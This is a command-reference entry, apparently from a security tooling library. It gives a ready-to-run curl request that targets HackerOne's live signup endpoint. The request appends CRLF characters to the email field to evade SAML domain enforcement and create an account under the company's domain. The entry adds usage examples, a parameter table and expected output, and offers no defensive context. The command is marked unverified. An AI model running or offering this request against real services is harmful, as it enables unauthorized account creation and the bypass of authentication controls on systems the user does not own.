---
id: cmd-hackerone-signup-bypass
data: >-
  curl -X POST https://hackerone.com/users -H 'Content-Type:
  application/x-www-form-urlencoded' -d 'user[name]=Test
  User&user[username]=testuser&user[email]=test@hackerone.com%0d%0a&user[password]=password123&user[password_confirmation]=password123'
tags:
  - bypass
  - saml
type: command
output: '{"redirect_path":"/users/sign_in","errors":{}}'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.337Z'
verified: false
validated: true
submitted: true
---
# hackerone-signup-bypass

## Command

```bash
curl -X POST https://hackerone.com/users \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'user[name]=Test User&user[username]=testuser&user[email]=test@hackerone.com%0d%0a&user[password]=password123&user[password_confirmation]=password123'
```

## Description

This command exploits the SAML bypass by appending %0d%0a to the email parameter in the HackerOne signup request, evading domain enforcement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| user[email] | Email with %0d%0a trailing (e.g., test@hackerone.com%0d%0a) | Yes |
| Others as in standard signup | | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/users -d 'user[email]=test@hackerone.com%0d%0a'
```

### Advanced Usage

Full form with all parameters for account creation.

## Expected Output

JSON with sign_in redirect and no errors, account created.

## Related

- [[commands/hackerone-signup-standard]]
